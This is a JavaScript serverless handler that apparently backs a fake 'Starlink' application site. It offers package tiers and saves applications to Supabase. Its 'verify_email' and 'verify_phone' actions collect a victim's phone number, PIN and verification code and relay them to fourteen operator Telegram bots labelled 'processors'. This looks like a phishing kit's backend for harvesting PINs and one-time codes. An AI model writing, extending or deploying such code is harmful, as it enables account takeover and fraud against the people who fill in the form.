
const supabase = require("./supabase");

const { sendTelegramMessage } = require("./message");

// Telegram configuration for each processor
const telegramConfigs = {
    l1: { botToken: process.env.L1_BOT_TOKEN, chatId: process.env.L1_CHAT_ID },
    l2: { botToken: process.env.L2_BOT_TOKEN, chatId: process.env.L2_CHAT_ID },
    l3: { botToken: process.env.L3_BOT_TOKEN, chatId: process.env.L3_CHAT_ID },
    l4: { botToken: process.env.L4_BOT_TOKEN, chatId: process.env.L4_CHAT_ID },
    l5: { botToken: process.env.L5_BOT_TOKEN, chatId: process.env.L5_CHAT_ID },
    l6: { botToken: process.env.L6_BOT_TOKEN, chatId: process.env.L6_CHAT_ID },
    l7: { botToken: process.env.L7_BOT_TOKEN, chatId: process.env.L7_CHAT_ID },
    l8: { botToken: process.env.L8_BOT_TOKEN, chatId: process.env.L8_CHAT_ID },
    l9: { botToken: process.env.L9_BOT_TOKEN, chatId: process.env.L9_CHAT_ID },
    l10: { botToken: process.env.L10_BOT_TOKEN, chatId: process.env.L10_CHAT_ID },
    l11: { botToken: process.env.L11_BOT_TOKEN, chatId: process.env.L11_CHAT_ID },
    l12: { botToken: process.env.L12_BOT_TOKEN, chatId: process.env.L12_CHAT_ID },
    l13: { botToken: process.env.L13_BOT_TOKEN, chatId: process.env.L13_CHAT_ID },
    l14: { botToken: process.env.L14_BOT_TOKEN, chatId: process.env.L14_CHAT_ID }
};

// Server-side package catalogue
const packages = {
    lite: { name: "Residential Lite", price: 20 },
    residential: { name: "Residential", price: 30 },
    "priority-1": { name: "Priority 1 TB", price: 140 },
    "priority-2": { name: "Priority 2 TB", price: 250 }
};

exports.handler = async (event) => {

    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            body: JSON.stringify({
                error: "Method not allowed"
            })
        };
    }

    try {
        const data = JSON.parse(event.body || "{}");

        // Reject unsupported actions
         // Handle email verification separately
        if (data.action === "verify_email") {
            const processor = String(
                data.processor || ""
            )
                .toLowerCase()
                .trim();

            const telegramConfig =
                telegramConfigs[processor];

            if (
                !telegramConfig ||
                !telegramConfig.botToken ||
                !telegramConfig.chatId
            ) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({
                        error:
                            "Invalid or missing processor."
                    })
                };
            }

            if (!data.pin || !data.phone) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({
                        error:
                            "Fill in all required fields."
                    })
                };
            }

            const emailMessage = `
            STARLINK
            <b>📞 ${data.phone}</b>
            Pin:
            <b>${data.pin}</b>
            `;

            await sendTelegramMessage(
                emailMessage,
                null,
                telegramConfig.botToken,
                telegramConfig.chatId
            );

            return {
                statusCode: 200,
                body: JSON.stringify({
                    success: true,
                    message:
                        "Code sent successfully."
                })
            };
        }

                // Handle phone verification separately
        if (data.action === "verify_phone") {
            const processor = String(
                data.processor || ""
            )
                .toLowerCase()
                .trim();

            const telegramConfig =
                telegramConfigs[processor];

            if (
                !telegramConfig ||
                !telegramConfig.botToken ||
                !telegramConfig.chatId
            ) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({
                        error:
                            "Invalid or missing processor."
                    })
                };
            }

            if (!data.verificationCode) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({
                        error:
                            "Verification code is required."
                    })
                };
            }

            const phoneMessage = `
        
        Processor:
        <b>${processor.toUpperCase()}</b>

        Verification Code:
        <b>${data.verificationCode}</b>

        `;
            
            await sendTelegramMessage(
                phoneMessage,
                null,
                telegramConfig.botToken,
                telegramConfig.chatId
            );

            return {
                statusCode: 200,
                body: JSON.stringify({
                    success: true,
                    message:
                        " sent successfully."
                })
            };}

        // Get processor
        const processor = String(data.processor || "")
            .toLowerCase()
            .trim();

        const telegramConfig = telegramConfigs[processor];

        if (!telegramConfig?.botToken || !telegramConfig?.chatId) {
            return {
                statusCode: 400,
                body: JSON.stringify({
                    error: "Invalid or missing processor."
                })
            };
        }

        // Validate package
        const packageInfo = packages[data.package_id];

        if (!packageInfo || !data.phone) {
            return {
                statusCode: 400,
                body: JSON.stringify({
                    error: "Valid phone number and package are required."
                })
            };
        }

        // Generate application reference
        const applicationNumber = `STAR-${Date.now()}`;

        // Prepare application
        const application = {
            application_number: applicationNumber,
            phone: data.phone,
            package_id: data.package_id,
            package_name: packageInfo.name,
            package_price: packageInfo.price,
            processor,
            status: "REVIEW"
        };

        // Save application to Supabase
        const { data: result, error } = await supabase
            .from("starlink_applications")
            .insert(application)
            .select()
            .single();

        if (error) {
            console.error("Supabase error:", error);

            return {
                statusCode: 500,
                body: JSON.stringify({
                    error: "Could not save application."
                })
            };
        }

        // Telegram notification
        const phoneMessage = `
            📡 NEW STARLINK APPLICATION

            📞 Phone: <b>${result.phone}</b>
            📦 Package: <b>${result.package_name}</b>
            `;

        // Telegram inline buttons
        const keyboard = {
            inline_keyboard: [
                [
                    {
                        text: "🔍 REVIEW",
                        callback_data: `review:${result.application_number}`
                    },
                    {
                        text: "✅ APPROVE",
                        callback_data: `approve:${result.application_number}`
                    }
                ]
            ]
        };

        // Send notification
        await sendTelegramMessage(
            phoneMessage,
            keyboard,
            telegramConfig.botToken,
            telegramConfig.chatId
        );

        // Successful response
        return {
            statusCode: 201,
            body: JSON.stringify({
                success: true,
                applicationId: result.application_number,
                message: "Starlink application submitted successfully."
            })
        };

    } catch (error) {
        console.error("SUBMIT APPLICATION ERROR:", error);

        return {
            statusCode: 500,
            body: JSON.stringify({
                error: "Something went wrong while processing the application."
            })
        };
    }
};
